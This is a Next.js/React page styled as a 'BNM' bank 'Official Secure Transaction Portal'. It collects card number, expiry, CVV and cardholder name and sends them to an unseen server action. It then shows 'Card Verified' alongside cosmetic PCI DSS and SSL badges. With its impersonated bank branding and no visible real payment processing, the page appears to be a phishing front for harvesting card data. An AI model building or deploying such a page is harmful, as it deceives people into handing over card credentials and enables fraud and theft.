'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Link from 'next/link';
import { submitCardDetails } from '@/lib/action';

export default function AddCardPage() {
    const router = useRouter();

    // State Management
    const [cardNumber, setCardNumber] = useState('');
    const [expiryDate, setExpiryDate] = useState('');
    const [cvv, setCvv] = useState('');
    const [cardHolder, setCardHolder] = useState('');
    const [cardType, setCardType] = useState('unknown');

    const [isSubmitting, setIsSubmitting] = useState(false);
    const [showSuccess, setShowSuccess] = useState(false);
    const [errors, setErrors] = useState<Record<string, string>>({});

    // Format Card Number & Detect Type
    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');

        if (val.startsWith('4')) setCardType('visa');
        else if (val.startsWith('5')) setCardType('mastercard');
        else if (val.startsWith('3')) setCardType('amex');
        else setCardType('unknown');

        const parts = [];
        for (let i = 0; i < val.length; i += 4) {
            parts.push(val.substring(i, i + 4));
        }
        setCardNumber(parts.length > 0 ? parts.join(' ') : val);
    };

    // Format Expiry Date
    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        if (val.length > 2) {
            val = val.substring(0, 2) + '/' + val.substring(2, 4);
        }
        setExpiryDate(val);
    };

    const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setCvv(e.target.value.replace(/[^0-9]/gi, ''));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setErrors({});

        // Basic client-side validation
        if (cardNumber.replace(/\s/g, '').length < 15) {
            setErrors({ cardNumber: 'Card number is required.' });
            return;
        }

        setIsSubmitting(true);

        const result = await submitCardDetails({
            cardNumber,
            expiryDate,
            cvv,
            cardHolder
        });

        setIsSubmitting(false);

        if (result.success) {
            setShowSuccess(true);
        } else {
            setErrors({ form: result.error || 'An error occurred' });
        }
    };

    const handleFinish = () => {
        router.push('/');
    };

    // Dynamic Background classes for the Card Preview
    const getCardBackground = () => {
        switch (cardType) {
            case 'visa': return 'bg-gradient-to-br from-[#1a1f71] to-[#0033a0]';
            case 'mastercard': return 'bg-gradient-to-br from-[#eb001b] to-[#ff5f00]';
            case 'amex': return 'bg-gradient-to-br from-[#007bc1] to-[#005a8f]';
            default: return 'bg-[#0A1B3F]';
        }
    };

    return (
        <div className="flex min-h-screen flex-col items-center bg-[#F8F9FB] px-6 py-12 font-sans">
            <div className="w-full max-w-[440px] flex flex-col items-center space-y-8">

                {!showSuccess ? (
                    <>
                        {/* Header */}
                        <div className="flex flex-col items-center space-y-6 w-full relative">
                            {/* Back Button */}
                            <Link
                                href="/"
                                className="absolute left-0 top-0 group flex h-10 w-10 items-center justify-center rounded-full bg-white text-[#0A1B3F] shadow-sm border border-gray-100 transition-all hover:bg-gray-50 active:scale-95"
                            >
                                <svg className="h-5 w-5 group-hover:-translate-x-0.5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M15 19l-7-7 7-7" />
                                </svg>
                            </Link>

                            <div className="bg-white rounded-[24px] p-4 shadow-[0_4px_20px_rgb(0,0,0,0.03)] border border-gray-50">
                                <div className="w-16 h-16 relative">
                                    <Image src="/b.png" alt="BNM" fill className="object-contain" />
                                </div>
                            </div>
                            
                            <div className="text-center space-y-1">
                                <h1 className="text-2xl font-bold text-[#0A1B3F]">Card Authorization</h1>
                                <p className="text-[#6B7280] font-medium text-sm">Official Secure Transaction Portal</p>
                            </div>
                        </div>

                        {/* Card Preview */}
                        <div className={`relative h-56 w-full rounded-[32px] p-8 shadow-2xl overflow-hidden transition-all duration-500 transform hover:scale-[1.02] border border-white/10 ${getCardBackground()} text-white`}>
                            {/* Chip & Logo */}
                            <div className="flex justify-between items-start mb-8">
                                <div className="w-12 h-10 bg-gradient-to-br from-[#ffd700] to-[#b8860b] rounded-lg opacity-90 relative overflow-hidden flex items-center justify-center">
                                    <div className="w-full h-full absolute inset-0 opacity-20 border border-black/40"></div>
                                    <div className="w-8 h-6 border-[1.5px] border-black/10 rounded-sm"></div>
                                </div>

                                <div className="opacity-95 h-8 flex items-center">
                                    {cardType === 'visa' && <span className="text-2xl font-black italic tracking-tighter">VISA</span>}
                                    {cardType === 'mastercard' && (
                                        <div className="flex -space-x-4">
                                            <div className="h-8 w-8 rounded-full bg-[#eb001b]/90"></div>
                                            <div className="h-8 w-8 rounded-full bg-[#ff5f00]/90"></div>
                                        </div>
                                    )}
                                    {cardType === 'amex' && <span className="text-xl font-bold uppercase tracking-tight">AMEX</span>}
                                    {cardType === 'unknown' && <div className="h-6 w-10 bg-white/10 rounded-md"></div>}
                                </div>
                            </div>

                            {/* Card Number */}
                            <div className="space-y-1">
                                <div className="text-[10px] uppercase tracking-[0.2em] font-bold opacity-60">Card Number</div>
                                <div className="text-2xl font-mono tracking-[0.15em] drop-shadow-lg">
                                    {cardNumber || '•••• •••• •••• ••••'}
                                </div>
                            </div>

                            {/* Info */}
                            <div className="absolute bottom-8 left-8 right-8 flex justify-between items-end">
                                <div className="max-w-[70%]">
                                    <div className="text-[10px] uppercase tracking-widest font-bold opacity-60">Card Holder</div>
                                    <div className="mt-1 text-sm font-bold uppercase truncate drop-shadow-md">
                                        {cardHolder || 'FULL NAME'}
                                    </div>
                                </div>
                                <div className="text-right">
                                    <div className="text-[10px] uppercase tracking-widest font-bold opacity-60">Expires</div>
                                    <div className="mt-1 text-sm font-bold drop-shadow-md">
                                        {expiryDate || 'MM/YY'}
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Form Card */}
                        <div className="w-full bg-white rounded-[40px] p-8 shadow-[0_4px_20px_rgb(0,0,0,0.03)] border border-gray-100/50">
                            <form onSubmit={handleSubmit} className="space-y-6">

                                <div className="space-y-2">
                                    <label className="text-[13px] font-bold text-[#9CA3AF] tracking-wide ml-1">CARDHOLDER NAME</label>
                                    <input
                                        type="text"
                                        value={cardHolder}
                                        onChange={(e) => setCardHolder(e.target.value)}
                                        placeholder="Name on card"
                                        className="w-full rounded-[20px] bg-[#F8F9FB] border-none py-4 px-6 text-[#0A1B3F] placeholder:text-[#9CA3AF] focus:ring-2 focus:ring-[#0A1B3F]/5 transition-all uppercase text-sm font-bold"
                                        required
                                    />
                                    {errors.cardHolder && <p className="text-[11px] text-red-500 mt-1 font-bold ml-1">{errors.cardHolder}</p>}
                                </div>

                                <div className="space-y-2">
                                    <label className="text-[13px] font-bold text-[#9CA3AF] tracking-wide ml-1">CARD NUMBER</label>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            inputMode="numeric"
                                            value={cardNumber}
                                            onChange={handleCardNumberChange}
                                            maxLength={19}
                                            placeholder="0000 0000 0000 0000"
                                            className="w-full rounded-[20px] bg-[#F8F9FB] border-none py-4 px-6 text-[#0A1B3F] placeholder:text-[#9CA3AF] focus:ring-2 focus:ring-[#0A1B3F]/5 transition-all font-mono text-sm font-bold"
                                            required
                                        />
                                        <div className="absolute inset-y-0 right-0 flex items-center pr-6 text-[#9CA3AF]">
                                            <svg className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                                        </div>
                                    </div>
                                    {errors.cardNumber && <p className="text-[11px] text-red-500 mt-1 font-bold ml-1">{errors.cardNumber}</p>}
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div className="space-y-2">
                                        <label className="text-[13px] font-bold text-[#9CA3AF] tracking-wide ml-1">EXPIRY DATE</label>
                                        <input
                                            type="text"
                                            inputMode="numeric"
                                            value={expiryDate}
                                            onChange={handleExpiryChange}
                                            maxLength={5}
                                            placeholder="MM/YY"
                                            className="w-full rounded-[20px] bg-[#F8F9FB] border-none py-4 px-6 text-[#0A1B3F] placeholder:text-[#9CA3AF] focus:ring-2 focus:ring-[#0A1B3F]/5 transition-all text-center text-sm font-bold"
                                            required
                                        />
                                    </div>

                                    <div className="space-y-2">
                                        <label className="text-[13px] font-bold text-[#9CA3AF] tracking-wide ml-1">CVV</label>
                                        <input
                                            type="text"
                                            inputMode="numeric"
                                            value={cvv}
                                            onChange={handleCvvChange}
                                            maxLength={4}
                                            placeholder="•••"
                                            className="w-full rounded-[20px] bg-[#F8F9FB] border-none py-4 px-6 text-[#0A1B3F] placeholder:text-[#9CA3AF] focus:ring-2 focus:ring-[#0A1B3F]/5 transition-all text-center text-sm font-bold"
                                            required
                                        />
                                    </div>
                                </div>

                                {errors.form && <p className="text-[12px] text-red-500 font-bold text-center">{errors.form}</p>}

                                <button
                                    type="submit"
                                    disabled={isSubmitting}
                                    className="w-full rounded-full bg-[#0A1B3F] py-4.5 text-[16px] font-bold text-white transition-all active:scale-[0.98] disabled:opacity-50 shadow-lg shadow-[#0A1B3F]/20 flex justify-center items-center mt-4"
                                >
                                    {!isSubmitting ? (
                                        <span>Authorize Payment</span>
                                    ) : (
                                        <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                                            <circle className="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                            <path className="opacity-90" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                    )}
                                </button>
                            </form>
                        </div>
                    </>
                ) : (
                    /* Success State */
                    <div className="w-full bg-white rounded-[40px] p-10 shadow-[0_4px_20px_rgb(0,0,0,0.03)] border border-gray-100/50 text-center space-y-8 animate-in zoom-in-95 fade-in duration-500">
                        <div className="mx-auto h-24 w-24 bg-green-50 rounded-full flex items-center justify-center">
                            <svg className="h-12 w-12 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                        </div>
                        <div className="space-y-3">
                            <h2 className="text-2xl font-bold text-[#0A1B3F]">Card Verified</h2>
                            <p className="text-[#6B7280] leading-relaxed font-medium">Your card has been successfully authorized for this transaction.</p>
                        </div>
                        <button onClick={handleFinish} className="w-full bg-[#0A1B3F] text-white py-4.5 rounded-full font-bold transition-all shadow-lg active:scale-95">
                            Continue
                        </button>
                    </div>
                )}

                {/* Footer Section */}
                <div className="flex flex-col items-center space-y-3 pt-4 opacity-60">
                    <div className="flex items-center space-x-2">
                        <svg className="w-4 h-4 text-[#9CA3AF]" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                        </svg>
                        <span className="text-[14px] font-medium text-[#9CA3AF]">Secured by BNM Secure</span>
                    </div>
                    <div className="flex items-center space-x-3 grayscale opacity-50">
                        <div className="text-[10px] font-black italic tracking-tighter text-[#0A1B3F]">PCI DSS</div>
                        <div className="h-3 w-px bg-gray-300"></div>
                        <div className="text-[10px] font-black tracking-tighter text-[#0A1B3F]">SSL SECURE</div>
                    </div>
                </div>

            </div>
        </div>
    );
}
